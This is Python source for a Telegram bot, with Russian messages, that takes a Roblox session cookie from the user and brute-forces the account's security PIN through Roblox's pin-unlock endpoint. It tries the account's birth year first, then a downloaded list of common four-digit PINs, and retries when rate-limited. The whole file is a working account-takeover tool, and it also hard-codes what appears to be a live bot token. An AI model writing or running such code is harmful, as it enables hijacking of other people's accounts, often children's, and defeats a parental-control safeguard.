from aiogram import Bot, Dispatcher, types
from aiogram.utils import executor
import aiohttp
import asyncio

API_TOKEN = '7487124463:AAH4-2miGWJWrTElrFtb5Ma1fWgnl-LRZlY'

bot = Bot(token=API_TOKEN)
dp = Dispatcher(bot)


user_cookies = {}
user_tasks = {}

current_pin_index = {}

async def get_xcsrf_token(session, cookie):
    async with session.post('https://auth.roblox.com/v1/login', cookies={".ROBLOSECURITY": cookie}) as token_response:
        xcsrf = token_response.headers.get('x-csrf-token')
        return xcsrf

@dp.message_handler(commands=['delete'])
async def delete_cookie(message: types.Message):
    user_id = message.from_user.id
    if user_id in user_cookies:
        del user_cookies[user_id]
        
        if user_id in user_tasks and not user_tasks[user_id].done():
            user_tasks[user_id].cancel()
            await message.reply("Ваша кука удалена. Процесс перебора пинов остановлен.")
        else:
            await message.reply("Ваша кука удалена, но процесс не был активен.")
    else:
        await message.reply("У вас нет активной куки для удаления.")

@dp.message_handler(content_types=types.ContentType.TEXT)
async def handle_text_message(message: types.Message):
    user_id = message.from_user.id
    user_message = message.text

    
    if not user_message.startswith('_|'):
        return  

  
    if user_id in user_cookies:
        return  

   
    user_cookies[user_id] = user_message
    current_pin_index[user_id] = 0  

    
    if user_id not in user_tasks or user_tasks[user_id].done():
        user_tasks[user_id] = asyncio.create_task(handle_cookie(user_id, message))


async def handle_cookie(user_id, message):
    cookie = user_cookies[user_id]  
    url = 'https://auth.roblox.com/v1/account/pin/unlock'

    async with aiohttp.ClientSession() as session:
        try:
            
            async with session.get('https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Common-Credentials/four-digit-pin-codes-sorted-by-frequency-withcount.csv') as pins_response:
                common_pins = await pins_response.text()
            
            pinss = [pin.split(',')[0] for pin in common_pins.splitlines()]

            async def ye():
                
                if user_id not in user_cookies:
                    return False
                
                
                xcsrf = await get_xcsrf_token(session, cookie)
                
                if not xcsrf:
                    await message.reply("Ошибка: не удалось получить x-csrf-token. Проверьте правильность куки.")
                    return False

                header = {'X-CSRF-TOKEN': xcsrf}
                payload = {'pin': year}

                async with session.post(url, data=payload, headers=header, cookies={".ROBLOSECURITY": cookie}) as r:
                    re = await r.text()
                    if "unlockedUntil" in re:
                        await message.reply(f"Pin найден: {year}")
                        return True
                    elif "Incorrect" in re:
                        await message.reply(f"Неверный пин: {year}")
                        return False
                return False

            async def ran():
                global current_pin_index  
              

                try:
                    while current_pin_index[user_id] < len(pinss):
                        pin = pinss[current_pin_index[user_id]]

                        
                        if user_id not in user_cookies:
                            await message.reply("Процесс остановлен, кука удалена.")
                            return

                        
                        xcsrf = await get_xcsrf_token(session, cookie)

                        if not xcsrf:
                            await message.reply("Ошибка: не удалось получить x-csrf-token. Проверьте правильность куки.")
                            return

                        header = {'X-CSRF-TOKEN': xcsrf}
                        payload = {'pin': pin}
                        
                        async with session.post(url, data=payload, headers=header, cookies={".ROBLOSECURITY": cookie}) as r:
                            re = await r.text()
                            if "unlockedUntil" in re:
                                await message.reply(f"Пин найден: {pin}")
                                return
                            elif "Incorrect" in re:
                                await message.reply(f"Неверный пин: {pin}")
                                
                                current_pin_index[user_id] += 1  
                            elif "Too many requests" in re:
                                await message.reply("RateLimit")
                                await ran()
                            elif "Unauthorized" in re:
                                await message.reply("Недействительная кука")
                                return
                            else:
                                await message.reply(f"{re}")
                                await ran()

                except Exception as e:
                    await message.reply(f"Произошла ошибка: {e}")
            
        
            async with session.get("https://accountinformation.roblox.com/v1/birthdate", cookies={".ROBLOSECURITY": cookie}) as birthdate_response:
                d = await birthdate_response.json()

            if 'birthYear' not in d:
                await message.reply("Ошибка: не удалось получить дату рождения. Проверьте правильность куки.")
                return

            year = str(d['birthYear'])

            
            if not await ye():
                await ran()
                    
        except asyncio.CancelledError:
            await message.reply("Процесс был прерван пользователем.")
        except Exception as e:
            await message.reply(f"Произошла ошибка: {e}")

if __name__ == '__main__':
    # Запуск бота
    executor.start_polling(dp, skip_updates=True)
